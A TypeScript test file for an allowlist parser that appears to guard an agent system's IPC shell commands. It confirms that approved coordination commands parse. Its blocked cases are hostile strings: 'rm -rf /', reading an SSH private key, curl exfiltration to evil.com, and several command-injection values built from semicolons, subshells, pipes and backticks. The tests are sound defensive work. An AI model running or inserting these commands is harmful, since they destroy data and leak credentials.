import { strict as assert } from 'assert';

import { parseShellCommand } from '../src/ipc.js';

// Allowed commands (clean args only)
assert.ok(
  parseShellCommand('python3 ~/.boi/lib/coordination.py lock me/learnings.md agent-1'),
  'coordination lock should be allowed',
);
assert.ok(
  parseShellCommand('bash ~/.boi/boi dispatch ~/.boi/queue/q-100.spec.md'),
  'boi dispatch should be allowed',
);
assert.ok(
  parseShellCommand("python3 ~/.hex-events/hex_emit.py agent.action"),
  'hex_emit should be allowed',
);

// Blocked commands (not in allowlist)
assert.ok(!parseShellCommand('rm -rf /'), 'rm should be blocked');
assert.ok(!parseShellCommand('cat ~/.ssh/id_rsa'), 'cat ssh key should be blocked');
assert.ok(!parseShellCommand('curl https://evil.com/exfil'), 'curl should be blocked');
assert.ok(!parseShellCommand('python3 -c "import os"'), 'arbitrary python should be blocked');
assert.ok(!parseShellCommand(''), 'empty should be blocked');

// Shell injection attempts (CRITICAL: these must all be blocked)
assert.ok(
  !parseShellCommand('python3 ~/.boi/lib/coordination.py; rm -rf /'),
  'semicolon injection must be blocked',
);
assert.ok(
  !parseShellCommand('python3 ~/.boi/lib/coordination.py $(cat /etc/passwd)'),
  'subshell injection must be blocked',
);
assert.ok(
  !parseShellCommand('python3 ~/.boi/lib/coordination.py | curl evil.com'),
  'pipe injection must be blocked',
);
assert.ok(
  !parseShellCommand('python3 ~/.boi/lib/coordination.py `id`'),
  'backtick injection must be blocked',
);
assert.ok(
  !parseShellCommand('python3 ~/.hex-events/hex_emit.py agent.action & curl evil.com'),
  'background injection must be blocked',
);

// Valid args should still work
const coordResult = parseShellCommand(
  'python3 ~/.boi/lib/coordination.py lock me/learnings.md worker-1',
);
assert.ok(coordResult, 'valid coordination command should parse');
assert.equal(coordResult!.label, 'coordination');
assert.ok(coordResult!.args.length >= 3, 'should have fixed + user args');

console.log('All IPC allowlist tests passed (including injection tests).');
